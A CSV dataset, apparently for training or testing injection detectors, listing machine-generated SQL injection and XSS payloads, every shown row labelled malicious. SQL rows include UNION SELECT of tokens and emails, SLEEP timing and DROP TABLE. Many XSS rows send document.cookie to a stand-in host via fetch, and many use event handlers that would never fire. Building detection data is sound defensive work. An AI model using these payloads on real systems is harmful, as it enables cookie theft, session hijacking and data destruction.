text,label,attack_type,generator
`/**/OR/**/0<1/**/-- -,1,sqli,codellama
""")%0aAND%0a1=1%0a-- ",1,sqli,codellama
"') UNION SELECT email,uid,last_name,id,name FROM sessions%23",1,sqli,codellama
""")%0aOR%0a0<1%0a%23",1,sqli,codellama
']%0d%0aAND%0d%0a2>1%0d%0a/*x*/,1,sqli,codellama
`%0d%0aOR%0d%0a0<1%0d%0a--,1,sqli,codellama
'] AND 1 LIKE 1 /*x*/,1,sqli,codellama
`%0d%0aAND%0d%0a0<1%0d%0a/*x*/,1,sqli,codellama
'/**/AND/**/1 BETWEEN 0 AND 9/**/#,1,sqli,codellama
`%0d%0aOR%0d%0a1 LIKE 1%0d%0a/*x*/,1,sqli,codellama
' AND 1=1 -- -,1,sqli,codellama
']%0d%0aOR%0d%0a0<1%0d%0a-- -,1,sqli,codellama
']%0aOR%0a2>1%0a-- ,1,sqli,codellama
')%0d%0aOR%0d%0a0<1%0d%0a--,1,sqli,codellama
""")%0d%0aAND%0d%0a'a'='a'%0d%0a#",1,sqli,codellama
"""; SELECT SLEEP(5)%23",1,sqli,codellama
']+OR+1=1+#,1,sqli,codellama
""") OR 1 LIKE 1 --",1,sqli,codellama
`+AND+0<1+#,1,sqli,codellama
"""	OR	1 BETWEEN 0 AND 9	--",1,sqli,codellama
'%0d%0aAND%0d%0a2>1%0d%0a/*x*/,1,sqli,codellama
'); SELECT SLEEP(5)-- -,1,sqli,codellama
') AND 1 LIKE 1 -- ,1,sqli,codellama
`%0aOR%0a''=''%0a#,1,sqli,codellama
"""); DROP TABLE users--",1,sqli,codellama
'] OR 1=1 LIMIT 1--,1,sqli,codellama
'] OR 1=1 #,1,sqli,codellama
` OR 1=1 LIMIT 1-- ,1,sqli,codellama
""" UNION SELECT token,user FROM staff/*x*/",1,sqli,codellama
`	AND	1=2	-- -,1,sqli,codellama
'; SELECT SLEEP(5)-- ,1,sqli,codellama
']	OR	1 LIKE 1	-- -,1,sqli,codellama
'%0aOR%0a'a'='a'%0a/*x*/,1,sqli,codellama
"""%09AND%090<1%09-- -",1,sqli,codellama
`%0d%0aOR%0d%0a'a'='a'%0d%0a-- -,1,sqli,codellama
')%0d%0aAND%0d%0a1 BETWEEN 0 AND 9%0d%0a/*x*/,1,sqli,codellama
`+AND+'a'='a'+-- -,1,sqli,codellama
'] OR 1=2 -- ,1,sqli,codellama
"""; DROP TABLE staff--",1,sqli,codellama
"""><iframe oninput=location='//x.io'>",1,xss,codellama
"""><svg oninput=alert(document.cookie)>",1,xss,codellama
"<iframe src=""javascript:confirm(1)"">",1,xss,codellama
"<script onclick=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
"""><div onerror=fetch('//x.io/'+document.cookie)>",1,xss,codellama
"<body onfocus=""alert(1)"">",1,xss,codellama
'><input onfocus=alert(1)>,1,xss,codellama
'><iframe onfocus=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
<script onload=print()>,1,xss,codellama
<marquee onstart=alert(document.cookie)>,1,xss,codellama
<body onpointerover=alert(1)>,1,xss,codellama
"""><img ontoggle=print()>",1,xss,codellama
<audio ontoggle=alert(document.cookie)>,1,xss,codellama
'><img oninput=print()>,1,xss,codellama
'><audio onclick=confirm(1)>,1,xss,codellama
"""><script oninput=eval(atob('YWxlcnQoMSk'))>",1,xss,codellama
"""><video oninput=eval(atob('YWxlcnQoMSk'))>",1,xss,codellama
'><details onclick=fetch('//x.io/'+document.cookie)>,1,xss,codellama
"""><script oninput=location='//x.io'>",1,xss,codellama
"""><details onpointerover=fetch('//x.io/'+document.cookie)>",1,xss,codellama
<marquee ontoggle=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
'><object oninput=alert(document.domain)>,1,xss,codellama
<video onload=confirm(1)>,1,xss,codellama
"""><script onpointerover=print()>",1,xss,codellama
"<body onanimationstart=""alert(document.domain)"">",1,xss,codellama
'><details ontoggle=alert(document.domain)>,1,xss,codellama
<video ontoggle=alert(1)>,1,xss,codellama
"<a onpointerover=""alert(document.cookie)"">",1,xss,codellama
'><div onpointerover=location='//x.io'>,1,xss,codellama
"<body oninput=""print()"">",1,xss,codellama
<video onanimationstart=alert(document.domain)>,1,xss,codellama
<div onmouseover=alert(1)>,1,xss,codellama
"<div onfocus=""eval(atob('YWxlcnQoMSk'))"">",1,xss,codellama
'><svg onclick=alert(1)>,1,xss,codellama
"""><body onload=eval(atob('YWxlcnQoMSk'))>",1,xss,codellama
'><script oninput=alert(document.domain)>,1,xss,codellama
"<body ontoggle=""confirm(1)"">",1,xss,codellama
"<marquee onfocus=""alert(document.domain)"">",1,xss,codellama
"""><div ontoggle=location='//x.io'>",1,xss,codellama
"""><img ontoggle=alert(document.cookie)>",1,xss,codellama
"<marquee onload=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
"""><audio onpointerover=fetch('//x.io/'+document.cookie)>",1,xss,codellama
'><details onerror=alert(1)>,1,xss,codellama
<details onerror=alert(document.domain)>,1,xss,codellama
'><img onanimationstart=print()>,1,xss,codellama
"""><object onpointerover=location='//x.io'>",1,xss,codellama
'><img onfocus=print()>,1,xss,codellama
"""><video onanimationstart=print()>",1,xss,codellama
<video ontoggle=confirm(1)>,1,xss,codellama
"<audio ontoggle=""alert(1)"">",1,xss,codellama
"""><input onfocus=print()>",1,xss,codellama
"<marquee onanimationstart=""alert(document.domain)"">",1,xss,codellama
"<audio onclick=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
"<script onerror=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
"""><video onpointerover=alert(document.cookie)>",1,xss,codellama
'><svg onanimationstart=fetch('//x.io/'+document.cookie)>,1,xss,codellama
'><iframe onerror=alert(document.domain)>,1,xss,codellama
"<a onerror=""confirm(1)"">",1,xss,codellama
<img onanimationstart=print()>,1,xss,codellama
'><details onclick=print()>,1,xss,codellama
<iframe onload=alert(document.cookie)>,1,xss,codellama
"<video onstart=""location='//x.io'"">",1,xss,codellama
"""><details onpointerover=alert(document.cookie)>",1,xss,codellama
<body onstart=location='//x.io'>,1,xss,codellama
<img onclick=alert(document.domain)>,1,xss,codellama
"""><audio onfocus=alert(1)>",1,xss,codellama
"<iframe oninput=""print()"">",1,xss,codellama
<iframe onanimationstart=print()>,1,xss,codellama
<object ontoggle=print()>,1,xss,codellama
'><svg onerror=alert(1)>,1,xss,codellama
"<script onclick=""alert(document.cookie)"">",1,xss,codellama
"<video onanimationstart=""eval(atob('YWxlcnQoMSk'))"">",1,xss,codellama
'><svg onanimationstart=alert(1)>,1,xss,codellama
<input onclick=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
"""><a onstart=alert(document.cookie)>",1,xss,codellama
<svg onload=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
<script onclick=confirm(1)>,1,xss,codellama
'><details onmouseover=alert(1)>,1,xss,codellama
"<div onstart=""alert(document.cookie)"">",1,xss,codellama
"""><div onfocus=eval(atob('YWxlcnQoMSk'))>",1,xss,codellama
'><details onclick=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
"""><input onpointerover=eval(atob('YWxlcnQoMSk'))>",1,xss,codellama
"<a href=""javascript:alert(document.domain)"">x</a>",1,xss,codellama
"<script onload=""confirm(1)"">",1,xss,codellama
"<input onmouseover=""confirm(1)"">",1,xss,codellama
"<script onclick=""alert(1)"">",1,xss,codellama
<img onclick=alert(document.cookie)>,1,xss,codellama
"<div onmouseover=""eval(atob('YWxlcnQoMSk'))"">",1,xss,codellama
<script onload=alert(document.cookie)>,1,xss,codellama
<div onmouseover=alert(document.cookie)>,1,xss,codellama
<marquee ontoggle=fetch('//x.io/'+document.cookie)>,1,xss,codellama
'><script oninput=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
<input onclick=alert(document.cookie)>,1,xss,codellama
<body ontoggle=confirm(1)>,1,xss,codellama
<marquee onload=fetch('//x.io/'+document.cookie)>,1,xss,codellama
<input onstart=confirm(1)>,1,xss,codellama
'><svg onclick=fetch('//x.io/'+document.cookie)>,1,xss,codellama
"<iframe onmouseover=""eval(atob('YWxlcnQoMSk'))"">",1,xss,codellama
"""><marquee ontoggle=fetch('//x.io/'+document.cookie)>",1,xss,codellama
"<audio onerror=""alert(document.domain)"">",1,xss,codellama
"""><object onload=eval(atob('YWxlcnQoMSk'))>",1,xss,codellama
'><audio onload=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
"<a onstart=""alert(document.cookie)"">",1,xss,codellama
<object onstart=alert(1)>,1,xss,codellama
<svg onfocus=print()>,1,xss,codellama
'><body onerror=confirm(1)>,1,xss,codellama
"""><div onfocus=alert(document.domain)>",1,xss,codellama
'><script onclick=alert(document.domain)>,1,xss,codellama
<details onfocus=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
"<script onstart=""eval(atob('YWxlcnQoMSk'))"">",1,xss,codellama
<img onfocus=alert(document.cookie)>,1,xss,codellama
'><script onpointerover=location='//x.io'>,1,xss,codellama
"""><script ontoggle=eval(atob('YWxlcnQoMSk'))>",1,xss,codellama
"""><marquee onerror=confirm(1)>",1,xss,codellama
<svg onerror=confirm(1)>,1,xss,codellama
'><img onanimationstart=confirm(1)>,1,xss,codellama
"""><input onclick=confirm(1)>",1,xss,codellama
<body onclick=location='//x.io'>,1,xss,codellama
'><svg onclick=alert(document.domain)>,1,xss,codellama
<iframe onpointerover=fetch('//x.io/'+document.cookie)>,1,xss,codellama
<svg onclick=alert(document.cookie)>,1,xss,codellama
"<object oninput=""print()"">",1,xss,codellama
"<video onfocus=""alert(document.domain)"">",1,xss,codellama
"<body onfocus=""alert(document.cookie)"">",1,xss,codellama
"<input onstart=""eval(atob('YWxlcnQoMSk'))"">",1,xss,codellama
"""><marquee onstart=print()>",1,xss,codellama
'><img onerror=location='//x.io'>,1,xss,codellama
<div onclick=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
"""><script oninput=alert(document.domain)>",1,xss,codellama
'><audio onfocus=alert(document.domain)>,1,xss,codellama
'><audio onfocus=alert(1)>,1,xss,codellama
"<body onerror=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
"<marquee ontoggle=""eval(atob('YWxlcnQoMSk'))"">",1,xss,codellama
"""><div onpointerover=eval(atob('YWxlcnQoMSk'))>",1,xss,codellama
"<img onmouseover=""alert(document.cookie)"">",1,xss,codellama
"""><body onfocus=fetch('//x.io/'+document.cookie)>",1,xss,codellama
"""><marquee onload=print()>",1,xss,codellama
"<script onpointerover=""eval(atob('YWxlcnQoMSk'))"">",1,xss,codellama
'><img onanimationstart=alert(document.domain)>,1,xss,codellama
"<script onpointerover=""alert(document.cookie)"">",1,xss,codellama
<a oninput=fetch('//x.io/'+document.cookie)>,1,xss,codellama
"<iframe src=""javascript:print()"">",1,xss,codellama
'><marquee ontoggle=alert(document.cookie)>,1,xss,codellama
"""><img onstart=location='//x.io'>",1,xss,codellama
'><marquee oninput=print()>,1,xss,codellama
"<audio oninput=""confirm(1)"">",1,xss,codellama
'><a onpointerover=alert(document.cookie)>,1,xss,codellama
'><input onpointerover=location='//x.io'>,1,xss,codellama
'><video ontoggle=location='//x.io'>,1,xss,codellama
'><body ontoggle=fetch('//x.io/'+document.cookie)>,1,xss,codellama
<a onpointerover=alert(1)>,1,xss,codellama
"<div oninput=""print()"">",1,xss,codellama
<a onclick=location='//x.io'>,1,xss,codellama
<a onclick=confirm(1)>,1,xss,codellama
"""><body onmouseover=location='//x.io'>",1,xss,codellama
"<script onstart=""location='//x.io'"">",1,xss,codellama
"<script ontoggle=""location='//x.io'"">",1,xss,codellama
"""><a oninput=alert(document.domain)>",1,xss,codellama
"""><input onstart=print()>",1,xss,codellama
"<object onmouseover=""location='//x.io'"">",1,xss,codellama
"""><audio onload=alert(document.domain)>",1,xss,codellama
"<audio onpointerover=""confirm(1)"">",1,xss,codellama
'><div onerror=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
"<marquee onanimationstart=""location='//x.io'"">",1,xss,codellama
"<a onclick=""confirm(1)"">",1,xss,codellama
"""><script onclick=alert(document.cookie)>",1,xss,codellama
<script onerror=alert(document.cookie)>,1,xss,codellama
<script oninput=alert(document.domain)>,1,xss,codellama
<img onstart=alert(1)>,1,xss,codellama
"<marquee onload=""confirm(1)"">",1,xss,codellama
'><script onmouseover=fetch('//x.io/'+document.cookie)>,1,xss,codellama
'><input onmouseover=alert(document.domain)>,1,xss,codellama
'><img onfocus=alert(document.cookie)>,1,xss,codellama
<details onpointerover=print()>,1,xss,codellama
<marquee onerror=confirm(1)>,1,xss,codellama
"""><object onstart=fetch('//x.io/'+document.cookie)>",1,xss,codellama
'><object ontoggle=fetch('//x.io/'+document.cookie)>,1,xss,codellama
<details onfocus=print()>,1,xss,codellama
<div onstart=print()>,1,xss,codellama
<marquee onstart=alert(1)>,1,xss,codellama
"<iframe ontoggle=""location='//x.io'"">",1,xss,codellama
<input onpointerover=alert(1)>,1,xss,codellama
<details oninput=print()>,1,xss,codellama
"""><object onmouseover=print()>",1,xss,codellama
<details ontoggle=alert(document.domain)>,1,xss,codellama
"<body onerror=""eval(atob('YWxlcnQoMSk'))"">",1,xss,codellama
'><input onpointerover=fetch('//x.io/'+document.cookie)>,1,xss,codellama
<audio onload=alert(1)>,1,xss,codellama
"""><div onfocus=confirm(1)>",1,xss,codellama
"<input oninput=""alert(document.domain)"">",1,xss,codellama
"""><img onfocus=fetch('//x.io/'+document.cookie)>",1,xss,codellama
<input oninput=confirm(1)>,1,xss,codellama
<body onfocus=alert(1)>,1,xss,codellama
"<img onpointerover=""alert(document.cookie)"">",1,xss,codellama
<script onload=alert(document.domain)>,1,xss,codellama
"<marquee ontoggle=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
'><iframe onfocus=print()>,1,xss,codellama
<object oninput=fetch('//x.io/'+document.cookie)>,1,xss,codellama
<details oninput=alert(document.domain)>,1,xss,codellama
'><input onanimationstart=fetch('//x.io/'+document.cookie)>,1,xss,codellama
<input oninput=print()>,1,xss,codellama
"<details onmouseover=""confirm(1)"">",1,xss,codellama
'><script ontoggle=confirm(1)>,1,xss,codellama
<script onstart=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
"""><img onpointerover=alert(document.cookie)>",1,xss,codellama
"<details onload=""alert(document.domain)"">",1,xss,codellama
<input onpointerover=alert(document.cookie)>,1,xss,codellama
<details oninput=confirm(1)>,1,xss,codellama
"<marquee onstart=""confirm(1)"">",1,xss,codellama
'><video ontoggle=alert(document.domain)>,1,xss,codellama
'><video onerror=confirm(1)>,1,xss,codellama
"<object onclick=""location='//x.io'"">",1,xss,codellama
"<img onclick=""print()"">",1,xss,codellama
"<audio oninput=""print()"">",1,xss,codellama
"<img ontoggle=""alert(1)"">",1,xss,codellama
"<marquee onerror=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
"""><a ontoggle=print()>",1,xss,codellama
<svg ontoggle=print()>,1,xss,codellama
"<marquee onclick=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
"<body ontoggle=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
"<object onload=""alert(document.cookie)"">",1,xss,codellama
'><img onstart=alert(document.domain)>,1,xss,codellama
"<div oninput=""location='//x.io'"">",1,xss,codellama
'><iframe onstart=location='//x.io'>,1,xss,codellama
'><marquee onmouseover=confirm(1)>,1,xss,codellama
<script oninput=alert(document.cookie)>,1,xss,codellama
"""><marquee onstart=fetch('//x.io/'+document.cookie)>",1,xss,codellama
"""><marquee onclick=fetch('//x.io/'+document.cookie)>",1,xss,codellama
<script ontoggle=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
'><svg onpointerover=alert(document.cookie)>,1,xss,codellama
<object onpointerover=alert(document.cookie)>,1,xss,codellama
'><iframe oninput=location='//x.io'>,1,xss,codellama
'><video onstart=confirm(1)>,1,xss,codellama
'><a onclick=confirm(1)>,1,xss,codellama
'><audio onmouseover=alert(document.domain)>,1,xss,codellama
"<details ontoggle=""alert(1)"">",1,xss,codellama
"<audio onstart=""alert(document.domain)"">",1,xss,codellama
"<script onfocus=""location='//x.io'"">",1,xss,codellama
<marquee onmouseover=alert(document.domain)>,1,xss,codellama
"<video ontoggle=""eval(atob('YWxlcnQoMSk'))"">",1,xss,codellama
'><details onmouseover=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
"<video onpointerover=""alert(document.domain)"">",1,xss,codellama
<input onclick=fetch('//x.io/'+document.cookie)>,1,xss,codellama
"""><div onanimationstart=eval(atob('YWxlcnQoMSk'))>",1,xss,codellama
<img oninput=confirm(1)>,1,xss,codellama
"""><input onfocus=alert(document.domain)>",1,xss,codellama
"""><marquee onfocus=alert(document.domain)>",1,xss,codellama
<object onpointerover=location='//x.io'>,1,xss,codellama
"""><audio onstart=alert(document.cookie)>",1,xss,codellama
"<iframe onfocus=""eval(atob('YWxlcnQoMSk'))"">",1,xss,codellama
"""><video onerror=fetch('//x.io/'+document.cookie)>",1,xss,codellama
"""><video ontoggle=alert(document.domain)>",1,xss,codellama
"""><iframe onload=print()>",1,xss,codellama
"<a onerror=""alert(document.domain)"">",1,xss,codellama
'><iframe onmouseover=alert(1)>,1,xss,codellama
<a onclick=alert(1)>,1,xss,codellama
'><input onerror=alert(document.cookie)>,1,xss,codellama
"<img onpointerover=""eval(atob('YWxlcnQoMSk'))"">",1,xss,codellama
"<iframe src=""java	script:fetch('//x.io/'+document.cookie)"">",1,xss,codellama
"""><video onmouseover=print()>",1,xss,codellama
<audio ontoggle=location='//x.io'>,1,xss,codellama
'><audio ontoggle=alert(document.domain)>,1,xss,codellama
"""><svg onanimationstart=confirm(1)>",1,xss,codellama
"""><script onmouseover=print()>",1,xss,codellama
"""><object ontoggle=alert(document.cookie)>",1,xss,codellama
'><details oninput=fetch('//x.io/'+document.cookie)>,1,xss,codellama
"<body onstart=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
<video onpointerover=alert(1)>,1,xss,codellama
'><svg onclick=location='//x.io'>,1,xss,codellama
"""><div onmouseover=print()>",1,xss,codellama
<object oninput=print()>,1,xss,codellama
"""><div ontoggle=confirm(1)>",1,xss,codellama
'><details oninput=alert(document.cookie)>,1,xss,codellama
"""><iframe onerror=print()>",1,xss,codellama
"""><svg onload=alert(1)>",1,xss,codellama
"""><img onpointerover=alert(1)>",1,xss,codellama
"""><object ontoggle=location='//x.io'>",1,xss,codellama
<iframe onclick=confirm(1)>,1,xss,codellama
"<video onmouseover=""alert(document.domain)"">",1,xss,codellama
"<a onpointerover=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
<details onclick=confirm(1)>,1,xss,codellama
"<iframe src=""javascript:alert(document.domain)"">",1,xss,codellama
"""><marquee onfocus=eval(atob('YWxlcnQoMSk'))>",1,xss,codellama
"""><img onload=fetch('//x.io/'+document.cookie)>",1,xss,codellama
'><svg onfocus=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
'><object onclick=confirm(1)>,1,xss,codellama
'><details onerror=alert(document.domain)>,1,xss,codellama
"""><a ontoggle=location='//x.io'>",1,xss,codellama
"<div onstart=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
"""><iframe onpointerover=alert(1)>",1,xss,codellama
"""><script onmouseover=alert(1)>",1,xss,codellama
<script>confirm(1)</script>,1,xss,codellama
<details onclick=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
<object oninput=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
"""><img onanimationstart=eval(atob('YWxlcnQoMSk'))>",1,xss,codellama
'><marquee onerror=alert(1)>,1,xss,codellama
<svg onstart=print()>,1,xss,codellama
"""><audio onpointerover=confirm(1)>",1,xss,codellama
"""><video onstart=alert(document.cookie)>",1,xss,codellama
<a onerror=alert(1)>,1,xss,codellama
"<iframe onfocus=""alert(document.cookie)"">",1,xss,codellama
'><details onerror=confirm(1)>,1,xss,codellama
"<svg oninput=""eval(atob('YWxlcnQoMSk'))"">",1,xss,codellama
<img onload=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
<audio onmouseover=alert(1)>,1,xss,codellama
"""><iframe onstart=fetch('//x.io/'+document.cookie)>",1,xss,codellama
<input onstart=fetch('//x.io/'+document.cookie)>,1,xss,codellama
'><a onerror=alert(1)>,1,xss,codellama
'><input onfocus=confirm(1)>,1,xss,codellama
"""><input ontoggle=fetch('//x.io/'+document.cookie)>",1,xss,codellama
<iframe ontoggle=fetch('//x.io/'+document.cookie)>,1,xss,codellama
'><img onload=confirm(1)>,1,xss,codellama
'><input onstart=alert(1)>,1,xss,codellama
"<video onfocus=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
"<svg ontoggle=""alert(document.domain)"">",1,xss,codellama
<audio onload=confirm(1)>,1,xss,codellama
"""><video onpointerover=location='//x.io'>",1,xss,codellama
"<object onclick=""alert(document.domain)"">",1,xss,codellama
"""><marquee onanimationstart=confirm(1)>",1,xss,codellama
"""><a onpointerover=alert(document.cookie)>",1,xss,codellama
'><marquee onerror=fetch('//x.io/'+document.cookie)>,1,xss,codellama
"<body onclick=""confirm(1)"">",1,xss,codellama
"""><video onload=alert(document.domain)>",1,xss,codellama
"""><input oninput=alert(document.cookie)>",1,xss,codellama
<input onanimationstart=fetch('//x.io/'+document.cookie)>,1,xss,codellama
'><marquee onstart=alert(document.cookie)>,1,xss,codellama
<div ontoggle=alert(document.cookie)>,1,xss,codellama
"""><body onfocus=alert(document.domain)>",1,xss,codellama
'><img onmouseover=fetch('//x.io/'+document.cookie)>,1,xss,codellama
'><audio oninput=print()>,1,xss,codellama
<object onload=alert(document.domain)>,1,xss,codellama
"<a onpointerover=""confirm(1)"">",1,xss,codellama
"""><img onload=print()>",1,xss,codellama
'><audio onanimationstart=print()>,1,xss,codellama
'><a onfocus=confirm(1)>,1,xss,codellama
'><audio onload=location='//x.io'>,1,xss,codellama
<svg onerror=fetch('//x.io/'+document.cookie)>,1,xss,codellama
"<script onerror=""eval(atob('YWxlcnQoMSk'))"">",1,xss,codellama
"""><a onpointerover=eval(atob('YWxlcnQoMSk'))>",1,xss,codellama
"""><body ontoggle=location='//x.io'>",1,xss,codellama
<audio oninput=fetch('//x.io/'+document.cookie)>,1,xss,codellama
<marquee ontoggle=alert(1)>,1,xss,codellama
<object oninput=confirm(1)>,1,xss,codellama
'><svg onfocus=location='//x.io'>,1,xss,codellama
"""><a onfocus=eval(atob('YWxlcnQoMSk'))>",1,xss,codellama
<script onanimationstart=print()>,1,xss,codellama
'><details oninput=alert(1)>,1,xss,codellama
"<details onfocus=""location='//x.io'"">",1,xss,codellama
"""><a ontoggle=confirm(1)>",1,xss,codellama
'><details onstart=confirm(1)>,1,xss,codellama
"<a onpointerover=""print()"">",1,xss,codellama
'><iframe oninput=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
"""><object onload=fetch('//x.io/'+document.cookie)>",1,xss,codellama
'><input onmouseover=fetch('//x.io/'+document.cookie)>,1,xss,codellama
<svg onfocus=alert(1)>,1,xss,codellama
"<object onload=""confirm(1)"">",1,xss,codellama
<object onload=alert(document.cookie)>,1,xss,codellama
<a onload=fetch('//x.io/'+document.cookie)>,1,xss,codellama
"""><input onanimationstart=alert(document.domain)>",1,xss,codellama
<video ontoggle=fetch('//x.io/'+document.cookie)>,1,xss,codellama
"""><a onfocus=location='//x.io'>",1,xss,codellama
'><script ontoggle=location='//x.io'>,1,xss,codellama
"<input oninput=""location='//x.io'"">",1,xss,codellama
'><div onclick=confirm(1)>,1,xss,codellama
'><marquee ontoggle=confirm(1)>,1,xss,codellama
"<body onanimationstart=""print()"">",1,xss,codellama
"<img onstart=""alert(document.cookie)"">",1,xss,codellama
"""><script onstart=alert(document.domain)>",1,xss,codellama
<video onanimationstart=alert(1)>,1,xss,codellama
"""><div onerror=alert(document.cookie)>",1,xss,codellama
"""><img oninput=location='//x.io'>",1,xss,codellama
<iframe oninput=location='//x.io'>,1,xss,codellama
"""><svg ontoggle=fetch('//x.io/'+document.cookie)>",1,xss,codellama
"<details onstart=""location='//x.io'"">",1,xss,codellama
<marquee ontoggle=alert(document.cookie)>,1,xss,codellama
"<body onanimationstart=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
'><details onclick=alert(1)>,1,xss,codellama
<video onload=location='//x.io'>,1,xss,codellama
"""><details onerror=confirm(1)>",1,xss,codellama
"""><marquee onfocus=confirm(1)>",1,xss,codellama
"<a ontoggle=""confirm(1)"">",1,xss,codellama
'><body oninput=alert(1)>,1,xss,codellama
"<marquee onload=""location='//x.io'"">",1,xss,codellama
"<script onmouseover=""print()"">",1,xss,codellama
"""><svg onmouseover=alert(document.domain)>",1,xss,codellama
<a onclick=alert(document.domain)>,1,xss,codellama
"""><a onclick=confirm(1)>",1,xss,codellama
'><marquee onclick=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
'><iframe ontoggle=alert(document.cookie)>,1,xss,codellama
'><body onclick=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
<a onpointerover=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
"<marquee onfocus=""alert(document.cookie)"">",1,xss,codellama
"<input oninput=""eval(atob('YWxlcnQoMSk'))"">",1,xss,codellama
"<a oninput=""alert(1)"">",1,xss,codellama
"""><img onclick=location='//x.io'>",1,xss,codellama
"<svg onfocus=""alert(1)"">",1,xss,codellama
"""><img oninput=alert(document.domain)>",1,xss,codellama
"<iframe onmouseover=""alert(document.cookie)"">",1,xss,codellama
'><div onanimationstart=fetch('//x.io/'+document.cookie)>,1,xss,codellama
'><script onclick=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
"<input onstart=""alert(document.cookie)"">",1,xss,codellama
"""><a onload=fetch('//x.io/'+document.cookie)>",1,xss,codellama
'><div onload=alert(document.domain)>,1,xss,codellama
<marquee onfocus=alert(document.domain)>,1,xss,codellama
<input onerror=alert(1)>,1,xss,codellama
<body onanimationstart=location='//x.io'>,1,xss,codellama
'><object onerror=fetch('//x.io/'+document.cookie)>,1,xss,codellama
"""><div onstart=alert(document.cookie)>",1,xss,codellama
"""><svg onpointerover=location='//x.io'>",1,xss,codellama
'><img onpointerover=alert(1)>,1,xss,codellama
<img onclick=print()>,1,xss,codellama
'><marquee onpointerover=location='//x.io'>,1,xss,codellama
"""><marquee ontoggle=alert(document.cookie)>",1,xss,codellama
"""><video ontoggle=eval(atob('YWxlcnQoMSk'))>",1,xss,codellama
<audio onstart=print()>,1,xss,codellama
<audio onstart=location='//x.io'>,1,xss,codellama
"<iframe src=""JaVaScRiPt:alert(document.cookie)"">",1,xss,codellama
<div onclick=alert(document.cookie)>,1,xss,codellama
"""><audio onmouseover=eval(atob('YWxlcnQoMSk'))>",1,xss,codellama
"""><div onclick=alert(1)>",1,xss,codellama
'><details ontoggle=location='//x.io'>,1,xss,codellama
<a onmouseover=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
"<svg ontoggle=""location='//x.io'"">",1,xss,codellama
<object onanimationstart=alert(1)>,1,xss,codellama
"<marquee onanimationstart=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
"""><div onstart=fetch('//x.io/'+document.cookie)>",1,xss,codellama
'><body onpointerover=alert(document.domain)>,1,xss,codellama
'><img onclick=alert(1)>,1,xss,codellama
"""><img onpointerover=print()>",1,xss,codellama
<object onerror=print()>,1,xss,codellama
'><video onload=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
"""><body onpointerover=confirm(1)>",1,xss,codellama
"""><object onanimationstart=alert(document.cookie)>",1,xss,codellama
"""><div onmouseover=fetch('//x.io/'+document.cookie)>",1,xss,codellama
"<a oninput=""alert(document.domain)"">",1,xss,codellama
"<script onstart=""print()"">",1,xss,codellama
'><input onclick=location='//x.io'>,1,xss,codellama
"""><a onstart=alert(document.domain)>",1,xss,codellama
